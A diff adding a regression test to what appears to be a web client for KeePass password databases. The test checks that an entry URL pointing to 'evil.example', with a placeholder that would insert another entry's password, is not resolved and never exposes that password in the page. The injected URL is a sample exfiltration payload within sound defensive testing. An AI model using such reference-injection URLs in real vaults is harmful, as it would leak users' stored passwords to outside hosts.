@@ -577,6 +577,18 @@ async function main() {
         expect(/carol/.test(await rows(p).filter({ hasText: 'Platzhalter' }).innerText()), 'Liste zeigt den Platzhalter statt carol');
         await p.click('#edit-btn');
         expect(await p.inputValue('#e-user') === '{S:Login}' && await p.inputValue('#e-url') === 'https://{S:Host}/{USERNAME}', 'Editor muss die Platzhalter zeigen');
+        await p.click('#cancel-btn');
+        // Ein (z. B. importierter) Eintrag, dessen URL das Passwort eines anderen Eintrags einsetzen wuerde: Link, Anzeige, Liste und
+        // "URL kopieren" behalten den Platzhalter, der Benutzername daneben wird weiter aufgeloest
+        const mailField = (a) => xc(['show', '-s', '-a', a, path.join(davRoot, 'platzhalter.kdbx'), 'Web/Mail']).trim().split('\n').pop();
+        const mailPw = mailField('Password'), mailUser = mailField('UserName');
+        await p.click('#new-btn');
+        await p.fill('#e-title', 'Fremd'); await p.fill('#e-url', 'https://evil.example/?p={REF:P@T:Mail}&u={REF:U@T:Mail}');
+        await p.click('#apply-btn');
+        const evil = p.locator('[data-testid=f-url]');
+        const want = `https://evil.example/?p={REF:P@T:Mail}&u=${mailUser}`;
+        expect(await evil.innerText() === want && await evil.getAttribute('href') === want, 'URL mit fremdem Passwort: ' + await evil.getAttribute('href'));
+        expect(!(await p.content()).includes(mailPw), 'Passwort von Mail steht im DOM');
         await p.context().close();
     });
 
